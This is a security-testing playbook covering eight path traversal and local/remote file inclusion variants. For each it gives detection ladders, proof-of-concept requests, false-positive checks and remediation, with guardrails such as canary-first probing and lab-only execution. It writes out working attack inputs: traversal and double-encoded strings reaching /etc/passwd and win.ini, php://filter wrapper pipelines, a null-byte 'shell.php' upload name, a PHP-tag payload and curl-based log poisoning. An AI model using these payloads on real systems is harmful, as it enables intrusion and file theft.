# Path Traversal / LFI & RFI Variants — Part 1 (V-01 … V-08)

Deep playbook sections for the first eight variants. Work the **Detect**
steps in order, climb the ladders in `payloads.md` only as far as impact proof
requires, and check **False positives** before writing anything up. Canary
first, system files second, execution proofs in the lab.

## Table of contents

- [V-01: Internal file resource inclusion via local file inclusion (LFI) filter breaks](#v-01-internal-file-resource-inclusion-via-local-file-inclusion-lfi-filter-breaks)
- [V-02: External script execution traversal via remote file inclusion (RFI) wrapper pipelines](#v-02-external-script-execution-traversal-via-remote-file-inclusion-rfi-wrapper-pipelines)
- [V-03: Directory separation invalidation via path traversal strings (../)](#v-03-directory-separation-invalidation-via-path-traversal-strings)
- [V-04: Core system profile access bypass (/etc/passwd or Windows/win.ini isolation mapping)](#v-04-core-system-profile-access-bypass-etchpasswd-or-windowswinini-isolation-mapping)
- [V-05: String parsing termination via null byte character injection (%00)](#v-05-string-parsing-termination-via-null-byte-character-injection-00)
- [V-06: Directory matching evasion via double URL encoding string sequences (%252e%252e%252f)](#v-06-directory-matching-evasion-via-double-url-encoding-string-sequences-252e252e252f)
- [V-07: Relative path overwrite (RPO) context confusions for script masquerading](#v-07-relative-path-overwrite-rpo-context-confusions-for-script-masquerading)
- [V-08: LFI to RCE mutation via log file stalking (Apache/Nginx/SSH log injection)](#v-08-lfi-to-rce-mutation-via-log-file-stalking-apachenginxssh-log-injection)

## V-01: Internal file resource inclusion via local file inclusion (LFI) filter breaks

**Mechanism:** The app passes a file-ish parameter to an include/read sink
*after* applying a filter — strip `../`, block a substring list, `basename()`,
prepend an include directory. The violated assumption is "the filter's output
still resolves inside the include dir": filters are single-pass string
operations, path resolution is canonicalization. Strip-once, decode-then-check,
or check-then-decode ordering bugs let a crafted sequence survive the filter
and *become* `../` only at the filesystem layer.

**Preconditions:**
- Include/read sink fed by user input: `page`, `file`, `template`, `lang`,
  `include`, `module`, `layout`, `doc`, `view`
- A filter exists but is single-pass (`str_replace('../','')`), substring-based,
  or runs before a second decode
- Optionally an extension allowlist (`.php`/`.html`) — then chain V-05 / V-09
- Target readable relative to the include dir, or absolute paths reach the sink raw

**Detect:**
1. Inventory path-ish params (query, URL segments, JSON body, `X-File`-style
   headers) and baseline a legitimate value (`?page=home`) — record status,
   length, content-type.
2. Build the oracle first: compare responses for an existing vs missing file
   (`?page=home` vs `?page=nope123`). A per-file difference (ENOENT text,
   length, latency) proves the app really opens files — that oracle is your
   detection signal for every later rung and your confirmation channel.
3. Filter-break ladder (payloads.md §3 rung 1): `....//....//<CANARY>` (single
   strip of `../` leaves `../`), `..././`, `..//..//`, `....\/`; then encoding
   rungs `..%2f`, `%2e%2e%2f`. Record content vs block vs no-change per rung.
4. Absolute-path probe: `?page=<CANARY_PATH>` — a raw `fopen($input)` sink
   accepts absolute paths outright; a `"$dir/$input"` sink does not. Which
   behavior you see tells you the sink shape (and whether V-04 applies).
5. If `basename()` is in play (traversal structurally impossible), stop this
   ladder and pivot: extension check → V-05, wrapper strings → V-09, URL param →
   V-02, session/log targets → V-08/V-13.
6. Watch decoding: input reflected *decoded twice* means two decode passes
   exist — jump to V-06; WAF 403 on plain probes — jump to V-12.

**Proof of concept:**
```
GET /view?page=<PLACEHOLDER_PAGE> HTTP/1.1

baseline:  page=home
strip:     page=....//....//....//<PLACEHOLDER_CANARY_PATH>   # Linux: /etc/hostname
encoded:   page=%2e%2e%2f%2e%2e%2f%2e%2e%2f<PLACEHOLDER_CANARY_PATH>
absolute:  page=<PLACEHOLDER_CANARY_PATH>
```

**Confirm:** Two independent signals: (a) canary content from a path outside
the include dir, *and* (b) the existence/missing oracle or a stack trace
naming the resolved absolute path, both reproducing on re-send. Content alone
can be reflection; the oracle alone is a lead.

**False positives:** WAF/error pages echoing your payload (decode it — if it's
your input, nothing was read). "Download" features returning *your own*
account's file by path — that's entitled access; prove escape with a path
outside the account directory. Client-side routers (`/#/page=`) never reach
the server. SPA fallbacks returning `index.html` for any path (200 ≠ read —
check body and content-type). A file that legitimately exists inside the
include dir at the same relative name (check the oracle).

**Impact:** Arbitrary file read as the web process: app source, config and
`.env` (secrets), session/token material, then RCE escalation via V-08/V-09.
Phrase as "arbitrary file read as `<user>`; demonstrated with canary `<path>`;
reachable secret classes: `<list>`" — never paste the secrets themselves.

**Remediation:** Resolve input through a fixed allowlist map of permitted
files, or `realpath()` the joined path and require the *final canonical* path
to stay under the include root — validate after normalization, never on raw
strings.

**CWE / OWASP:** CWE-22 (Path Traversal) / CWE-98 (File Inclusion); OWASP
Top 10 A01:2021 Broken Access Control; WSTG — Path Traversal.

## V-02: External script execution traversal via remote file inclusion (RFI) wrapper pipelines

**Mechanism:** The sink accepts a URL-ish string and *includes or fetches*
it — PHP `include($url)` with `allow_url_include`, `file_get_contents($url)`
into a renderer, a template loader that pulls over HTTP, or a wrapper pipeline
(`php://filter/resource=http://…`, `compress.zlib://http://…`) that rewrites a
"filtered" remote reference back into a fetchable one. The violated assumption
is "the path is a local, trusted resource": attacker-hosted bytes enter the
app's execution or render context from a server you control.

**Preconditions:**
- URL-ish param reaching an include/fetch sink (`url`, `src`, `load`, `remote`,
  `template`, `page`, `feed`, `import`)
- No scheme allowlist, or a wrapper/`http` filter that can be re-expressed
- For include-based RFI: `allow_url_include=On` (rare post-2015 — verify
  through the app, never by assumption); fetch-and-render paths need no such flag
- Outbound HTTP egress from the target server; attacker-controlled HTTPS/HTTP host

**Detect:**
1. Find URL-shaped params on features that plausibly pull remote content:
   language packs, "load from URL", RSS/import, theme/plugin fetch, link
   preview, webhook-style testers.
2. Safe probe first: `http://<PLACEHOLDER_OOB_DOMAIN>/rfi-001.txt` whose body
   is `RFI-MARKER-<TOKEN>`. Check two things: (a) an HTTP hit on your server
   from the target's IP (log UA — fingerprints the fetcher), (b) whether the
   marker text appears in the app's response. Both = inclusion; only (a) = plain
   SSRF → route to `ssrf-testing` instead of claiming RFI.
3. Wrapper-pipeline probe (read-only, payloads.md §2):
   `php://filter/convert.base64-encode/resource=http://<PLACEHOLDER_OOB_DOMAIN>/rfi-001.txt`
   — a response body containing the base64 of *your* file proves wrapper
   handling plus server-side fetch in one step, with zero code execution.
4. Distinguish include from fetch-render: if fetched content is embedded in an
   HTML page as data (never parsed as code), severity drops to SSRF/content-
   injection; if the runtime would *execute* `<?php … ?>`/template syntax from
   the fetched body, it's include-class RCE (proof in lab per guardrail).
5. Egress dead? Try your alternate port or an allowlisted-then-redirect host
   (your box 302s after the first hop) — note this as a redirect-bypass finding,
   same class.

**Proof of concept:**
```
GET /load?template=http://<PLACEHOLDER_OOB_DOMAIN>/rfi-001.txt HTTP/1.1

pipeline:  ?template=php://filter/convert.base64-encode/resource=http://<PLACEHOLDER_OOB_DOMAIN>/rfi-001.txt
remote body: RFI-MARKER-<TOKEN>
execution:   lab only — body "<?php echo 'RFI-OK'; ?>" or template syntax
```

**Confirm:** OOB HTTP hit from the target IP (source channel) *plus* your
marker content appearing in the response (in-band channel), reproducible. For
any execution claim: the benign marker executes in a lab clone — production
proof stops at content inclusion.

**False positives:** Frontend/client-side link previews (hit comes from *your*
browser IP and UA). Plain SSRF that fetches but never includes (marker absent
from response body). DNS prefetch/metadata scrapers hitting your domain without
HTTP. Your collaborator's own echo behavior. "RFI" claims where the app merely
*displays the URL string* you gave it.

**Impact:** Pre-auth RCE when the include executes attacker code (highest
class); otherwise SSRF/content-injection. Phrase per what you proved:
"server-side inclusion of attacker-controlled remote content, RCE feasible as
`<user>` — execution demonstrated in lab".

**Remediation:** Never include remote content — fetch through a vetted HTTP
client into a *data* variable with a strict host allowlist; disable
`allow_url_include`/`allow_url_fopen`; reject wrapper strings (`://`) in path
inputs.

**CWE / OWASP:** CWE-98 (Remote File Inclusion) / CWE-829 (Untrusted
Functionality); OWASP A03:2021 Injection (A08 where the flaw is trust in
remote functionality).

## V-03: Directory separation invalidation via path traversal strings (../)

**Mechanism:** A user path is concatenated onto a base directory
(`$dir . '/' . $input`) with no canonicalization before the open. `../`
segments are interpreted by the filesystem and resolve *above* the intended
root. The violated assumption — "the relative path stays inside base" — is
enforced nowhere: nothing checks the final resolved path.

**Preconditions:**
- Path-shaped param joined to a base dir (download, preview, template, image)
- No normalize-then-check, or check happens *before* a later decode/normalize
  (ordering bug → V-06 if encoding is needed)
- Target file readable by the service account; no chroot/open_basedir jail

**Detect:**
1. Baseline a known in-root file (`?file=readme.txt` or a public asset URL) —
   status, length, content-type.
2. Canary climb: `?file=<../ × N><CANARY_PATH>` sweeping N = 1…12. The depth
   at which the response changes (error band, content appears) tells you the
   base dir depth and often leaks the resolved absolute path in errors.
3. Separator matrix: `/`, `..\`, `..%5c`, `..\../`, `....\\` — Windows targets
   accept both separators (V-12 covers WAF-side encoding); Linux treats `\` as a
   filename character, so failures there are expected, not evidence of safety.
4. Absolute-path override: `<CANARY_PATH>` raw — some sinks treat an absolute
   input as the whole path (see V-04 for evidence rules).
5. Note *which layer* answered: app-level JSON error = app sink reached;
   webserver 400/404 with `nginx`/`Apache` signature = path normalized at the
   edge → route to V-14/V-15.
6. Plain blocked at a WAF? → V-12. Plain stripped once? → V-01. Double-encoded
   needed? → V-06. Record, don't re-test.

**Proof of concept:**
```
GET /download?file=<PLACEHOLDER_DOTSEGS><PLACEHOLDER_CANARY_PATH> HTTP/1.1

query:   file=../../../../../../etc/hostname
path:    GET /static/../../../../etc/hostname
json:    {"path": "../../../../etc/hostname"}
upload-name: filename="../../../../tmp/<PLACEHOLDER_CANARY_NAME>"
```

**Confirm:** Canary content from outside the root *plus* the depth/error
oracle (or a leaked resolved path in a stack trace) reproducing on re-send.
Two channels: content and path-resolution evidence.

**False positives:** Input reflected in errors or titles. A file that exists
at the same relative path inside the app dir (verify via the oracle). Front-end
or CDN rewriting the path before it hits the origin (test with and without
cache-busting). "Preview" features returning your own uploaded file (entitled —
escape the account dir to prove traversal). Generic 200 fallback HTML from
SPAs.

**Impact:** Arbitrary file read as the service account — source, config, secrets,
and (with V-08/V-09) RCE escalation. Phrase as "path traversal in `<param>`
yields arbitrary read as `<user>`; canary `<path>` returned at depth N".

**Remediation:** `realpath()` the joined path and require a canonical-prefix
match against the allowed root (reject if it escapes); better, replace free-form
paths with an allowlist lookup of logical file IDs.

**CWE / OWASP:** CWE-22 (Path Traversal); OWASP A01:2021 Broken Access
Control; WSTG — Input Validation / Path Traversal.

## V-04: Core system profile access bypass (/etc/passwd or Windows/win.ini isolation mapping)

**Mechanism:** The app isolates files *logically* (per-user folders, jailed
names, "you may only read your own exports") but paths resolve into the shared
OS namespace — `/etc/passwd`, `C:\Windows\win.ini`, neighbor tenant
directories. Nothing at the filesystem layer enforces the logical boundary, so
a traversal step or an absolute path proves isolation exists only in UI text.
"Isolation mapping" is the same flaw in multi-tenant apps: account→directory is
a *path component* (`/data/tenants/<id>/`, `/home/<user>/`), and the client can
re-map which tenant's directory gets opened.

**Preconditions:**
- Traversal/absolute-path reach established (V-01/V-03/V-06)
- Service account can read the target (it usually can for `/etc/passwd`-class)
- No effective jail: no chroot, no `open_basedir`, no read-only container FS
  — or a bypassable one (mis-scoped `open_basedir` is common)
- For tenant mapping: predictable account→path scheme and a read operation
  keyed by that path

**Detect:**
1. Canary first (guardrail): prove namespace escape with `/etc/hostname`
   (Linux) or a public asset — never open with system files.
2. Minimal system signature (second stage, minimal-evidence rule): request
   `/etc/hostname`… then `/etc/passwd` and retain **only** the first line
   (`root:x:0:0:root:/root:/bin/bash`). That signature — not a dump — proves
   OS-namespace read. On Windows, request `C:\Windows\win.ini` and retain only
   the `[fonts]` header. **Do not request `/etc/shadow`, private keys,
   `credentials`, or `.aws/`** — if the traversal pattern implies they resolve,
   state reachability in the report and stop.
3. Nonexistence oracle: same probe against `/etc/notafile-<TOKEN>` — a
   *different* error (ENOENT vs content) proves the signature came from the
   filesystem, not from a fixture.
4. Tenant-mapping probe (entitled proof): fetch **your own** account file
   through the path scheme, then swap in a single adjacent placeholder ID. If
   another account's data returns, you also have broken access control — chain
   `bac-idor-testing`; guardrail: stop at one adjacent placeholder, evidence =
   structural difference with content redacted, never collect other users' data.
5. OS cross-check: `win.ini` failing while `/etc/hostname` succeeds pins the
   target OS and rules out bundled fixture files (repo copies of `/etc/passwd`
   do exist).

**Proof of concept:**
```
GET /export?path=<PLACEHOLDER_CANARY_PATH> HTTP/1.1   # stage 1: canary
GET /export?path=/etc/passwd                           # stage 2: keep line 1 only
GET /export?path=C:\Windows\win.ini                    # Windows: keep [fonts] header only
GET /export?path=/data/tenants/<PLACEHOLDER_OWN_ID>/…  # entitled baseline
GET /export?path=/data/tenants/<ADJACENT_ID>/…         # one probe, redacted evidence
```

**Confirm:** The OS signature line *plus* the nonexistence oracle differential
(ENOENT for `/etc/notafile` vs content for `/etc/passwd`), reproducible twice.
Reflection cannot produce an OS-specific signature with a working oracle.

**False positives:** Honeypot/WAF pages echoing your requested path. Fixture
files bundled with the app (check leaked source — chain `info-disclosure-
testing`; a repo copy of `/etc/passwd` won't pair with a live ENENT oracle for
invented names). Docker images where `/etc/passwd` appears in the app's own
data directory — `/etc/hostname` and `/proc/version` distinguish these.
Plain reflection of the path string in an error page (decode and compare).

**Impact:** Logical isolation doesn't exist at the FS layer: read any file the
service account can read, and (tenant form) read across account boundaries.
Phrase as "file namespace escape as `<user>`; isolation boundary enforced only
at application level; evidence: redacted OS signature". Severity: High/Critical
pre-auth; note the tenant-mapping variant separately as BAC.

**Remediation:** Enforce isolation at the filesystem layer (container
read-only mounts, chroot/`open_basedir` scoped tightly) *and* keep the
canonical-prefix check; for tenants, resolve paths server-side from an internal
record ID — never from a client-supplied path segment.

**CWE / OWASP:** CWE-22 (Path Traversal) + CWE-200 (Info Exposure) / CWE-639
(Authorization Bypass by User-Controlled Key); OWASP A01:2021 Broken Access
Control.

## V-05: String parsing termination via null byte character injection (%00)

**Mechanism:** Input crosses into a layer that treats strings as C-style
null-terminated: bytes after `%00` are discarded at the native boundary while
the application's string-level check validated the *whole* string, including a
decoy suffix (`file.php%00.png` — the app checks `.png`, the OS opens
`file.php`). The violated assumption is "the string the filter saw is the
string the OS opened". This is a legacy-runtime bug: PHP < 5.3.4, old C/C++
components, ancient app servers — not a modern-stack technique.

**Preconditions:**
- Legacy runtime or native component without length-aware path handling
- A suffix-dependent check to defeat: extension allowlist, forced `.png`
  append, signature/`..` filter that validates the tail
- The NUL survives transport (some frameworks reject `%00` outright — that
  rejection itself is signal)

**Detect:**
1. Find suffix-dependent sinks: extension allowlists, forced suffix appends,
   "image only" validators on download/preview params.
2. Baseline: `file=allowed.png` → allowed; `file=target.php` → blocked.
3. Probe matrix (one round, payloads.md §1 row 8): `file=<TARGET>%00.png`,
   `file=<TARGET>%00`, raw `\0` byte in a multipart body, `%2500` (only fires
   if a second decode exists), `..%00/`.
4. Read the differential: blocked → allowed *only* when NUL is present.
   Stronger evidence: an error message naming the **truncated** path (shows the
   native boundary fired).
5. Honesty rule: if the plain payload already works, there is no NUL
   dependency — that's V-01 (filter absent), not V-05. If one round of NUL
   probes changes nothing, record "stack is not NUL-truncating" and move on;
   don't build a report on a dead technique.
6. Windows-adjacent extras on IIS-era stacks: trailing dot/space (`file.php%00...`
   plus `file.php.` / `file.php%20`), NTFS ADS `::$DATA` — each is a separate
   legacy probe, never an assumption.

**Proof of concept:**
```
GET /render?img=cat.png → allowed
GET /render?img=secret.php%00.png → truncation → opens secret.php
GET /upload multipart: filename="shell.php%00.jpg"    # legacy upload bypass
```

**Confirm:** Content returned *only* when the NUL is present, **plus**
truncation evidence (error naming the shortened path, or a second file
uniquely reachable via the NUL variant). Reproducible twice.

**False positives:** WAF/proxy stripping `%00`, which silently makes the plain
payload work — you'd mis-attribute success (test plain payload *with and
without* the filter suspected). A filter that was never checking extensions at
all (V-01). Frameworks echoing `%00`-containing input in errors (reflection).
Scanner boilerplate claiming "null byte RCE" on modern stacks — verify runtime
age from headers/leaks before believing it.

**Impact:** Extension-check bypass → LFI of executable files / upload of
executable content → RCE class. Phrase as "legacy null-byte truncation defeats
`<check>` on `<runtime/version>`; escalate via include sink", with version
evidence — severity depends on what the bypass unlocks.

**Remediation:** Reject NUL and control characters during a pre-validation
canonicalization step before any path operation; use length-aware/binary-safe
file APIs; enforce extension/path allowlists on the final canonical path, not
on raw input.

**CWE / OWASP:** CWE-158 (Improper Neutralization of Null Byte) / CWE-170
(Improper Null Termination); OWASP A03:2021 Injection (A01 where it enables
path escape).

## V-06: Directory matching evasion via double URL encoding string sequences (%252e%252e%252f)

**Mechanism:** The value passes through at least two decode stages (edge proxy
→ WAF → framework auto-decode → app `urldecode`), or the filter decodes once
before checking while the sink decodes again. `%252e%252e%252f` decodes to the
inert literal `%2e%2e%2f` at the check, then to `../` only at the later decode.
The violated assumption is "what we validated is what the sink used" — true
only when decode count and check position line up.

**Preconditions:**
- ≥2 decoding layers, or check-before-decode ordering (very common in
  PHP: `$_GET` auto-decoded once, app calls `urldecode()`/`rawurldecode()`
  again)
- A filter that checks for `../` / `%2e%2e` at one specific encoding level
- Optionally a WAF in front whose decode depth differs from the app's

**Detect:**
1. Encoding matrix against a canary target (payloads.md §1): plain `../`,
   single `%2e%2e%2f`, double `%252e%252e%252f`, triple `%25252e…`, mixed
   `..%2f`, `%2e../`, `.%2e/`.
2. Record per variant: **blocked** (WAF 403/challenge), **accepted-no-effect**
   (200, no content), **content returned**. The finding signature is *plain
   blocked or inert + double-encoded returns canary content*.
3. Count decode passes from reflection: submit `%25252f` and inspect how many
   `%` levels come back echoed — each remaining level tells you a decoder *didn't*
   fire, and the differences pin which layer (WAF vs app) decodes how deep.
4. Cheaper discriminators first: if `..%2f` alone works while plain `../` is
   blocked, one decode layer is doing the work (report as single-encode bypass).
   Escalate to double/triple only when single fails.
5. Legacy one-probe checks: `%c0%ae` overlong UTF-8 and `%u002e` — expected to
   fail on modern stacks; record, never assume (V-12 covers the WAF-evasion
   framing).
6. Test non-query vectors where decode layers differ: multipart filename, JSON
   string values, `X-Original-URL`/`X-Rewrite-URL`, cookies, path segments —
   some layers decode only certain containers.
7. If a WAF is blocking, capture its block-page signature: you are claiming a
   *bypass*, so the WAF's presence must be evidenced too.

**Proof of concept:**
```
GET /download?file=<PLACEHOLDER_ENCODED> HTTP/1.1

plain:    ../../../../<PLACEHOLDER_CANARY_PATH>          → blocked / no content
single:   %2e%2e%2f%2e%2e%2f%2e%2e%2f<CANARY>            → blocked / no content
double:   %252e%252e%252f%252e%252e%252f<CANARY>          → CANARY CONTENT
triple:   %25252e%25252e%25252f%25252e%25252e%25252f<CANARY>
```

**Confirm:** The differential (encoded succeeds where plain fails) reproduces
twice, **plus** canary content or a path/oracle signal — two channels, one of
which is the block-vs-success contrast itself. Log which layer blocked the
plain variant (block-page signature).

**False positives:** No WAF and plain also works → that's V-03, not a bypass
(check your baseline!). Challenge pages reflecting the payload (decode and
compare — echo ≠ read). Double-encoded variant returning 200 with SPA fallback
HTML (check body). Misattributing the decode layer (test with/without the edge
proxy if the program exposes both). Cached 200 from an earlier plain probe.

**Impact:** Traversal behind a filter/WAF/double-decode → arbitrary read class
same as V-03, plus a WAF-bypass claim worth its own evidence. Phrase as
"double-URL-encoding bypass of `<filter/WAF name>` yields arbitrary file read;
decode-once-at-check ordering confirmed by differential".

**Remediation:** Decode exactly once at ingress, canonicalize, validate, and
pass that *same canonical string* to the sink; WAFs must inspect post-
normalization bytes; never decode again after validation.

**CWE / OWASP:** CWE-22 (Path Traversal) + CWE-178 (Improper Handling of
Case/Encoding Differences); OWASP A01:2021 (A05 where the WAF is the relied-
upon control).

## V-07: Relative path overwrite (RPO) context confusions for script masquerading

**Mechanism:** Pages reference assets with *relative* URLs (`src="js/app.js"`,
CSS `url(...)`), and browsers resolve them against the **current document's
URL path** — a path the attacker can deepen via user-content routes, pathinfo
suffixes, or an echoing 404 page. A relative reference on
`/app/view/../../uploads/evil/page` resolves *inside attacker-writable space on
the same origin*, so the browser fetches the attacker's file as if it were the
app's own script: script masquerading → same-origin JS execution without any
HTML injection. The violated assumption is "this relative URL always denotes
our asset".

**Preconditions:**
- Relative asset references (no leading `/`, no protocol, no `<base>` pinning)
- Attacker-influenced document path: user profile/content URLs, uploaded files
  under known paths, `/index.php/<anything>` pathinfo, custom 404/redirect
  pages that render HTML with relative refs
- A same-origin location the attacker can write to (upload with controllable
  filename/name-match, profile field rendered verbatim, stored doc)
- Victim interaction: the victim must open the crafted URL (this is
  XSS-class impact — coordinate evidence with `xss-testing`)

**Detect:**
1. Grep responses for relative references: HTML `src=`/`href=` without a
   leading `/` or scheme, CSS `url()`/`@import` relative, JS runtime loads.
   Record any `<base>` tag first — it re-pins resolution and kills classic RPO.
2. Map path influence: which routes accept attacker-chosen depth? Test
   `/user/<name>/`, upload URLs, `/index.php/..%2f..%2fpage`, and the 404
   handler (an HTML 404 echoing the path with relative refs is prime material).
3. Simulate resolution: request a deep crafted URL, compute what the browser
   *would* resolve for each relative ref (manual URL join, or headless browser
   in your lab), and check whether the target now lands in attacker-writable
   space.
4. Plant: upload/write a file whose name matches the masqueraded asset
   (`app.js`) containing a benign marker — `console.log('RPO-<TOKEN>')` in
   production-safe probes, `alert(document.domain)` only in lab.
5. Re-request the crafted URL and check: (a) server access logs / your HTTP
   server logs show the fetch of your file under the app's asset name from the
   origin, and (b) in a browser session (yours — authorized), the marker runs.
6. CSS variant: masquerade a stylesheet instead of a script — lower severity
   (data exfil / defacement) but real; note it and route the XSS-flavored
   evidence to `xss-testing`.

**Proof of concept:**
```
crafted doc:  <TARGET>/app/<PLACEHOLDER_USER_PATH>/..%2f..%2f<PLACEHOLDER_UPLOAD_DIR>/
   or         <TARGET>/index.php/..%2f..%2f<PLACEHOLDER_UPLOAD_DIR>/
app markup:   <script src="js/app.js">          ← relative, resolves off the crafted path
plant:        upload <PLACEHOLDER_UPLOAD_DIR>/js/app.js  body: console.log('RPO-<TOKEN>')
victim:       open crafted URL → same-origin fetch of planted file as js/app.js
```

**Confirm:** Two signals: (a) the planted file is fetched under the app's own
asset URL from the same origin (server/your access log line), and (b) the
marker executes in a browser session on the crafted URL. Both must reproduce;
(a) without (b) means content-type/CSP blocked execution — report as partial.

**False positives:** Absolute asset paths (leading `/`) — resolution never
moves, not RPO. A `<base href>` pinning resolution. Assets on a different
origin/CDN — no same-origin execution. SPA fallback returning `index.html`
(HTML served where JS was requested is *not* executed as script —
content-type matters). Your upload being fetched at its normal URL rather than
via the crafted path (check the *requested* path in logs). CSP blocking the
script (request-level confusion still stands; execution doesn't — say which).
Browser extensions/hydration fetching assets on their own.

**Impact:** Same-origin script execution via path confusion → session/token
theft and actions as the victim, requiring only a crafted-URL visit. Phrase as
"relative-URL path confusion lets attacker-writable content execute as
`<app asset>` on `<origin>`; victim interaction: visit crafted URL". Chain the
XSS-class evidence with `xss-testing`.

**Remediation:** Emit root-relative or absolute asset URLs (or pin `<base>`),
serve user-generated content on a separate origin with strict CSP, and
normalize/reject `..` segments in routed paths before rendering HTML.

**CWE / OWASP:** CWE-22 (Path Traversal) + CWE-79 (XSS via script
masquerading); OWASP A01:2021 + A03:2021.

## V-08: LFI to RCE mutation via log file stalking (Apache/Nginx/SSH log injection)

**Mechanism:** Web and system logs record attacker-controlled bytes — request
line/URL, User-Agent, Referer, headers, HTTP-auth and SSH usernames, search
strings. Logs are inert data — until an LFI *includes* one: with a PHP
`include()`, a planted `<?php … ?>` inside `access.log` executes as app code.
Two trust assumptions break at once: "log files are not code" and "the include
target is safe". The RCE step needs no new vulnerability — only the LFI (V-01/
V-03/V-06) plus a predictable log path.

**Preconditions:**
- Confirmed read-LFI first (canary read works) — poisoning without LFI is a
  different bug class
- A writable log channel: User-Agent/URL/Referer/header logging (Apache/Nginx),
  username logging (SSH `auth.log`, mail), app-level logs (search, comments)
- Guessable log path (payloads.md §6) or leaked via phpinfo/error (chain
  `info-disclosure-testing`)
- **Execution** needs a code-bearing sink (`include`/`require`); `readFile`
  only reads — that's a read-proof, still a finding, not RCE

**Detect:**
1. Confirm read-LFI with a canary (V-01 ladder) — do this before anything else;
   it decides whether the ladder below matters.
2. Choose injectable channels per target: User-Agent (works almost everywhere),
   request path, Referer, POST bodies that get logged, `Authorization` username,
   SSH username (lab/approved scope only), app search/comment fields.
3. Inject a unique marker, one channel at a time:
   `User-Agent: LOGPOISON-<TOKEN>` — a **read-back proof** (safe in production).
   PHP-tagged bodies (`<?php echo …; ?>`) are **lab-only** per guardrail.
4. Probe candidate paths (payloads.md §6): `/var/log/apache2/access.log`,
   `/var/log/httpd/access_log`, `/var/log/apache/access.log`,
   `/var/log/nginx/access.log`, `/var/log/auth.log`,
   `C:\xampp\apache\logs\access.log`, app logs under `<APP_ROOT>/logs/`.
   Containers often log to stdout only — an ENOENT is data, not failure; note
   "logs not file-backed" and try `/proc/self/fd/1` style probes only as
   read-proofs.
5. Sequence matters: inject → immediately include → search the response for
   your token → inject a *different* token → re-include. Changing tokens prove
   causality; a static match proves nothing.
6. Classify the outcome: token echoed **literally** = LFI + attacker-controlled
   log content (read-proof; also an XSS-class primitive when pages render it —
   chain `xss-testing`). Token **executed** (output differs from input) = RCE
   path → demonstrate with one benign marker in a **lab clone**, report
   feasibility from production.
7. Follow log rotation: `access.log.1`, `access.log.2.gz` (gzip needs a filter
   chain — see payloads.md §2), date-suffixed names in containers.

**Proof of concept:**
```
1) curl -s -A 'LOGPOISON-<TOKEN>' 'https://<TARGET>/<ANY_LOGGED_ENDPOINT>'
2) GET /view?page=../../../../<PLACEHOLDER_LOG_PATH>
   → response contains LOGPOISON-<TOKEN>
3) re-inject LOGPOISON-<TOKEN2> → re-include → token2 (causality)
```

**Confirm:** The token appears via the include *and* changes when you inject a
new one (causality channel), **plus** the canary LFI still returns unrelated
content on demand (rules out "this endpoint always returns that log"). Two
signals, reproducible.

**False positives:** WAF/error pages echoing your User-Agent (mutate the token
— echo vs file content differ immediately). The page reflecting the stored
value *without* inclusion (test a control parameter that isn't included).
Wrong log path with an app fallback rendering your input. Scanner boilerplate
claiming "log poisoning RCE" where only a static log read happened. journald/
stdout-only containers with no access.log file (then this variant's file form
is dead — say so honestly). Log lines HTML-escaped on render (token appears
encoded → read is real, execution/XSS angle is not).

**Impact:** LFI→RCE as the web user when the include executes (full app
compromise — describe as feasibility if proven in lab); at read level:
attacker-controlled content served through app pages (XSS primitive) plus log
disclosure (privacy). Phrase per what you proved, never claim RCE off a
literal echo.

**Remediation:** Fix the LFI (allowlist include targets) — that alone kills the
chain; keep logs outside every include path with restrictive permissions; run
the app with `open_basedir`/FS scoping; disable code-bearing wrappers in PHP
config.

**CWE / OWASP:** CWE-117 (Log Injection) + CWE-98/CWE-22 (File Inclusion /
Traversal); OWASP A03:2021 Injection + A01:2021 Broken Access Control.
